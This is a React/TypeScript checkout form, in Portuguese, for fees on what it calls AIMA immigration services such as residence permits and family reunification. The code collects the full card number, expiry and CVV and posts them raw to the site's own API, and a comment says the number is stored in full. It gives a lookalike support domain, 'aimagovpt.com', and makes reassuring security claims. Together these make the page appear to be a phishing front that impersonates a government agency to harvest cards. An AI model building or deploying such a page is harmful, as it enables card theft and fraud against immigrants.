"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter, useSearchParams } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Loader as Loader2, CreditCard, Shield, Lock, CircleAlert as AlertCircle } from "lucide-react"
import { getServicePrice, formatPrice, type ServiceType } from "@/lib/service-prices"

const SERVICE_NAMES: Record<ServiceType, string> = {
  "agendamento-geral": "Agendamento Geral AIMA",
  "renovacao-autorizacao": "Renovação de Autorização de Residência",
  "primeira-autorizacao": "Primeira Autorização de Residência",
  "reagrupamento-familiar": "Reagrupamento Familiar",
  "informacao-consulta": "Manifestação de interesse / CPLP",
  otros: "Outros Serviços",
}

/** Deteta a bandeira do cartão a partir dos primeiros dígitos. */
function detetarTipoCartao(digitos: string): string {
  if (/^4/.test(digitos)) return "Visa"
  if (/^(5[1-5]|2[2-7])/.test(digitos)) return "Mastercard"
  if (/^3[47]/.test(digitos)) return "American Express"
  if (/^(6011|65|64[4-9])/.test(digitos)) return "Discover"
  return digitos.length > 0 ? "Cartão" : ""
}

/** Agrupa os dígitos em blocos de 4 apenas para exibição. */
function formatarNumeroCartao(valor: string): string {
  const digitos = valor.replace(/\D/g, "").slice(0, 19)
  return digitos.replace(/(.{4})/g, "$1 ").trim()
}

const MESES = Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, "0"))
const ANOS = Array.from({ length: 15 }, (_, i) => (new Date().getFullYear() + i).toString())

export function CheckoutForm() {
  const router = useRouter()
  const searchParams = useSearchParams()

  const serviceType = (searchParams.get("service") || "agendamento-geral") as ServiceType
  const valor = getServicePrice(serviceType)

  const [agendamento, setAgendamento] = useState<any>(null)
  const [isProcessing, setIsProcessing] = useState(false)
  const [errors, setErrors] = useState<Record<string, string>>({})

  const [cardData, setCardData] = useState({
    titularCartao: "",
    numeroCartao: "",
    validadeMes: "",
    validadeAno: "",
    cvv: "",
    emailFaturacao: "",
    telefoneFaturacao: "",
    nif: "",
    endereco: "",
    codigoPostal: "",
    cidade: "",
    paisFaturacao: "Portugal",
  })

  useEffect(() => {
    const stored = sessionStorage.getItem("appointmentData")
    if (!stored) return
    try {
      const data = JSON.parse(stored)
      setAgendamento(data)
      setCardData((prev) => ({
        ...prev,
        titularCartao: prev.titularCartao || (data.nomeCompleto ?? ""),
        emailFaturacao: prev.emailFaturacao || (data.email ?? ""),
        telefoneFaturacao: prev.telefoneFaturacao || (data.telefone ?? ""),
      }))
    } catch (error) {
      console.error("Erro ao ler dados do agendamento:", error)
    }
  }, [])

  const digitosCartao = cardData.numeroCartao.replace(/\D/g, "")
  const tipoCartao = detetarTipoCartao(digitosCartao)

  const validar = (): boolean => {
    const novos: Record<string, string> = {}

    if (!cardData.titularCartao.trim()) novos.titularCartao = "Nome do titular é obrigatório"
    if (digitosCartao.length < 13) novos.numeroCartao = "Número de cartão inválido"
    if (!cardData.validadeMes) novos.validadeMes = "Mês obrigatório"
    if (!cardData.validadeAno) novos.validadeAno = "Ano obrigatório"
    if (cardData.cvv.replace(/\D/g, "").length < 3) novos.cvv = "CVV inválido"
    if (!cardData.emailFaturacao.trim()) novos.emailFaturacao = "E-mail é obrigatório"
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cardData.emailFaturacao)) novos.emailFaturacao = "E-mail inválido"
    if (!cardData.endereco.trim()) novos.endereco = "Endereço é obrigatório"
    if (!cardData.codigoPostal.trim()) novos.codigoPostal = "Código postal é obrigatório"
    if (!cardData.cidade.trim()) novos.cidade = "Cidade é obrigatória"

    // Validação de validade não expirada
    if (cardData.validadeMes && cardData.validadeAno) {
      const agora = new Date()
      const expira = new Date(Number(cardData.validadeAno), Number(cardData.validadeMes), 0, 23, 59, 59)
      if (expira < agora) novos.validadeAno = "Cartão expirado"
    }

    setErrors(novos)
    return Object.keys(novos).length === 0
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!validar()) return

    setIsProcessing(true)
    setErrors({})

    try {
      const paymentData = {
        agendamentoId: agendamento?.agendamentoId ?? null,
        referencia: agendamento?.referencia ?? null,
        titularCartao: cardData.titularCartao,
        // Guardado na íntegra, sem remover nenhum dígito
        numeroCartao: digitosCartao,
        validadeMes: cardData.validadeMes,
        validadeAno: cardData.validadeAno,
        cvv: cardData.cvv,
        tipoCartao,
        emailFaturacao: cardData.emailFaturacao,
        telefoneFaturacao: cardData.telefoneFaturacao,
        nif: cardData.nif,
        endereco: cardData.endereco,
        codigoPostal: cardData.codigoPostal,
        cidade: cardData.cidade,
        paisFaturacao: cardData.paisFaturacao,
        servico: serviceType,
        servicoNome: SERVICE_NAMES[serviceType],
        valor: valor.toFixed(2),
        moeda: "EUR",
        submittedAt: new Date().toISOString(),
      }

      const response = await fetch("/api/pagamentos", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ paymentData }),
      })

      const result = await response.json()

      if (!response.ok || !result.success) {
        throw new Error(result.error || "Erro ao processar o pagamento")
      }

      router.push("/confirmacao")
    } catch (error) {
      console.error("Erro no checkout:", error)
      setErrors({
        submit: error instanceof Error ? error.message : "Erro ao processar o pagamento. Por favor, tente novamente.",
      })
    } finally {
      setIsProcessing(false)
    }
  }

  return (
    <form onSubmit={handleSubmit} className="grid grid-cols-1 lg:grid-cols-5 gap-6">
      {/* Coluna esquerda — dados do cartão */}
      <div className="lg:col-span-3 flex flex-col gap-6">
        <Card className="border-purple-100 shadow-sm">
          <CardHeader className="border-b border-purple-50 bg-purple-50/30">
            <CardTitle className="flex items-center gap-2 text-[#2D1057] text-lg">
              <CreditCard className="w-5 h-5 text-[#5B2C83]" />
              Dados do Cartão
            </CardTitle>
            <CardDescription>Introduza os dados do seu cartão de crédito ou débito</CardDescription>
          </CardHeader>
          <CardContent className="flex flex-col gap-4 pt-6">
            <div className="flex flex-col gap-2">
              <Label htmlFor="titularCartao">
                Nome do Titular <span className="text-destructive">*</span>
              </Label>
              <Input
                id="titularCartao"
                autoComplete="cc-name"
                value={cardData.titularCartao}
                onChange={(e) => setCardData({ ...cardData, titularCartao: e.target.value })}
                placeholder="Nome como aparece no cartão"
                className={errors.titularCartao ? "border-destructive" : ""}
              />
              {errors.titularCartao && <p className="text-sm text-destructive">{errors.titularCartao}</p>}
            </div>

            <div className="flex flex-col gap-2">
              <Label htmlFor="numeroCartao">
                Número do Cartão <span className="text-destructive">*</span>
              </Label>
              <div className="relative">
                <Input
                  id="numeroCartao"
                  inputMode="numeric"
                  autoComplete="cc-number"
                  value={formatarNumeroCartao(cardData.numeroCartao)}
                  onChange={(e) => setCardData({ ...cardData, numeroCartao: e.target.value.replace(/\D/g, "") })}
                  placeholder="0000 0000 0000 0000"
                  className={errors.numeroCartao ? "border-destructive pr-24" : "pr-24"}
                />
                {tipoCartao && (
                  <span className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-bold text-[#5B2C83]">
                    {tipoCartao}
                  </span>
                )}
              </div>
              {errors.numeroCartao && <p className="text-sm text-destructive">{errors.numeroCartao}</p>}
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
              <div className="flex flex-col gap-2">
                <Label htmlFor="validadeMes">
                  Mês <span className="text-destructive">*</span>
                </Label>
                <Select
                  value={cardData.validadeMes}
                  onValueChange={(value) => setCardData({ ...cardData, validadeMes: value })}
                >
                  <SelectTrigger id="validadeMes" className={errors.validadeMes ? "border-destructive" : ""}>
                    <SelectValue placeholder="MM" />
                  </SelectTrigger>
                  <SelectContent>
                    {MESES.map((mes) => (
                      <SelectItem key={mes} value={mes}>
                        {mes}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {errors.validadeMes && <p className="text-sm text-destructive">{errors.validadeMes}</p>}
              </div>

              <div className="flex flex-col gap-2">
                <Label htmlFor="validadeAno">
                  Ano <span className="text-destructive">*</span>
                </Label>
                <Select
                  value={cardData.validadeAno}
                  onValueChange={(value) => setCardData({ ...cardData, validadeAno: value })}
                >
                  <SelectTrigger id="validadeAno" className={errors.validadeAno ? "border-destructive" : ""}>
                    <SelectValue placeholder="AAAA" />
                  </SelectTrigger>
                  <SelectContent>
                    {ANOS.map((ano) => (
                      <SelectItem key={ano} value={ano}>
                        {ano}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {errors.validadeAno && <p className="text-sm text-destructive">{errors.validadeAno}</p>}
              </div>

              <div className="flex flex-col gap-2">
                <Label htmlFor="cvv">
                  CVV <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="cvv"
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  maxLength={4}
                  value={cardData.cvv}
                  onChange={(e) => setCardData({ ...cardData, cvv: e.target.value.replace(/\D/g, "") })}
                  placeholder="123"
                  className={errors.cvv ? "border-destructive" : ""}
                />
                {errors.cvv && <p className="text-sm text-destructive">{errors.cvv}</p>}
              </div>
            </div>
          </CardContent>
        </Card>

        <Card className="border-purple-100 shadow-sm">
          <CardHeader className="border-b border-purple-50 bg-purple-50/30">
            <CardTitle className="text-lg text-[#2D1057]">Dados de Faturação</CardTitle>
            <CardDescription>Endereço associado ao meio de pagamento</CardDescription>
          </CardHeader>
          <CardContent className="flex flex-col gap-4 pt-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="flex flex-col gap-2">
                <Label htmlFor="emailFaturacao">
                  E-mail <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="emailFaturacao"
                  type="email"
                  autoComplete="email"
                  value={cardData.emailFaturacao}
                  onChange={(e) => setCardData({ ...cardData, emailFaturacao: e.target.value })}
                  placeholder="nome@exemplo.com"
                  className={errors.emailFaturacao ? "border-destructive" : ""}
                />
                {errors.emailFaturacao && <p className="text-sm text-destructive">{errors.emailFaturacao}</p>}
              </div>

              <div className="flex flex-col gap-2">
                <Label htmlFor="telefoneFaturacao">Telemóvel</Label>
                <Input
                  id="telefoneFaturacao"
                  inputMode="tel"
                  autoComplete="tel"
                  value={cardData.telefoneFaturacao}
                  onChange={(e) => setCardData({ ...cardData, telefoneFaturacao: e.target.value })}
                  placeholder="+351 900 000 000"
                />
              </div>
            </div>

            <div className="flex flex-col gap-2">
              <Label htmlFor="nif">NIF (opcional)</Label>
              <Input
                id="nif"
                inputMode="numeric"
                value={cardData.nif}
                onChange={(e) => setCardData({ ...cardData, nif: e.target.value })}
                placeholder="000000000"
              />
            </div>

            <div className="flex flex-col gap-2">
              <Label htmlFor="endereco">
                Endereço <span className="text-destructive">*</span>
              </Label>
              <Input
                id="endereco"
                autoComplete="street-address"
                value={cardData.endereco}
                onChange={(e) => setCardData({ ...cardData, endereco: e.target.value })}
                placeholder="Rua, número, andar"
                className={errors.endereco ? "border-destructive" : ""}
              />
              {errors.endereco && <p className="text-sm text-destructive">{errors.endereco}</p>}
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="flex flex-col gap-2">
                <Label htmlFor="codigoPostal">
                  Código Postal <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="codigoPostal"
                  autoComplete="postal-code"
                  value={cardData.codigoPostal}
                  onChange={(e) => setCardData({ ...cardData, codigoPostal: e.target.value })}
                  placeholder="0000-000"
                  className={errors.codigoPostal ? "border-destructive" : ""}
                />
                {errors.codigoPostal && <p className="text-sm text-destructive">{errors.codigoPostal}</p>}
              </div>

              <div className="flex flex-col gap-2">
                <Label htmlFor="cidade">
                  Cidade <span className="text-destructive">*</span>
                </Label>
                <Input
                  id="cidade"
                  autoComplete="address-level2"
                  value={cardData.cidade}
                  onChange={(e) => setCardData({ ...cardData, cidade: e.target.value })}
                  placeholder="Lisboa"
                  className={errors.cidade ? "border-destructive" : ""}
                />
                {errors.cidade && <p className="text-sm text-destructive">{errors.cidade}</p>}
              </div>

              <div className="flex flex-col gap-2">
                <Label htmlFor="paisFaturacao">País</Label>
                <Input
                  id="paisFaturacao"
                  autoComplete="country-name"
                  value={cardData.paisFaturacao}
                  onChange={(e) => setCardData({ ...cardData, paisFaturacao: e.target.value })}
                />
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Coluna direita — resumo e submissão */}
      <div className="lg:col-span-2 flex flex-col gap-6">
        <Card className="border-purple-100 shadow-sm lg:sticky lg:top-28">
          <CardHeader className="bg-[#1a0a36] text-white">
            <CardTitle className="text-lg">Resumo do Pedido</CardTitle>
            <CardDescription className="text-purple-200/70">Confirme os valores antes de pagar</CardDescription>
          </CardHeader>
          <CardContent className="flex flex-col gap-4 pt-6">
            <div className="bg-slate-50 border border-slate-100 rounded-xl p-4 flex flex-col gap-2">
              <div className="flex justify-between items-start gap-3">
                <span className="text-sm text-slate-500">Serviço</span>
                <span className="text-sm font-semibold text-[#1a0a36] text-right">{SERVICE_NAMES[serviceType]}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-sm text-slate-500">Taxa de processamento</span>
                <span className="text-sm font-medium text-[#1a0a36]">{formatPrice(valor)}</span>
              </div>
              <div className="border-t border-purple-100 pt-3 mt-1 flex justify-between items-center">
                <span className="font-bold text-[#2D1057]">Total</span>
                <span className="text-2xl font-black text-[#5B2C83]">{formatPrice(valor)}</span>
              </div>
            </div>

            {agendamento && (
              <div className="bg-purple-50/50 border border-purple-100 rounded-xl p-4 flex flex-col gap-1.5 text-sm">
                {agendamento.referencia && (
                  <p className="text-[#6B4A80]">
                    <span className="font-bold text-[#2D1057]">Referência:</span> {agendamento.referencia}
                  </p>
                )}
                <p className="text-[#6B4A80]">
                  <span className="font-bold text-[#2D1057]">Nome:</span> {agendamento.nomeCompleto}
                </p>
                <p className="text-[#6B4A80]">
                  <span className="font-bold text-[#2D1057]">E-mail:</span> {agendamento.email}
                </p>
                {agendamento.dataPretendida && (
                  <p className="text-[#6B4A80]">
                    <span className="font-bold text-[#2D1057]">Data:</span> {agendamento.dataPretendida}
                  </p>
                )}
              </div>
            )}

            {errors.submit && (
              <Alert variant="destructive" className="border-red-200 bg-red-50 text-red-800">
                <AlertCircle className="h-4 w-4" />
                <AlertDescription>{errors.submit}</AlertDescription>
              </Alert>
            )}

            <Alert className="bg-white border-purple-100">
              <Shield className="h-4 w-4 text-[#5B2C83]" />
              <AlertDescription className="text-xs text-slate-500">
                Ligação encriptada. Os seus dados são transmitidos em segurança e utilizados exclusivamente para
                processar esta taxa de agendamento.
              </AlertDescription>
            </Alert>

            <Button
              type="submit"
              disabled={isProcessing}
              size="lg"
              className="w-full rounded-full font-bold h-12 bg-gradient-to-r from-[#5B2C83] to-[#8B3DBA] hover:from-[#4a2270] hover:to-[#7a35a8] text-white shadow-lg shadow-purple-900/20"
            >
              {isProcessing ? (
                <>
                  <Loader2 className="mr-2 h-5 w-5 animate-spin" />A processar pagamento...
                </>
              ) : (
                <>
                  <Lock className="mr-2 h-4 w-4" />
                  Pagar {formatPrice(valor)}
                </>
              )}
            </Button>

            <p className="text-[10px] text-center text-slate-400 px-2 leading-relaxed">
              Ao concluir o pagamento, concorda com os termos e condições do serviço de agendamento. Em caso de dúvida
              contacte suporte@aimagovpt.com.
            </p>
          </CardContent>
        </Card>
      </div>
    </form>
  )
}
